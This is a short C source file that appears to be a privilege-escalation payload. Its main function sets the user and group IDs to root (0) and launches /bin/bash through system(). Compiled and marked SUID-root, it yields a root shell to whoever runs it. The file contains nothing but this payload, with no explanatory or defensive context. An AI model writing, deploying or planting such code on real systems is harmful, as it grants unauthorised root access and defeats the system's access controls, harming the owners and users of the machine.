#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(){
    setuid(0);
	setgid(0);
	system("/bin/bash");
	return 0;
}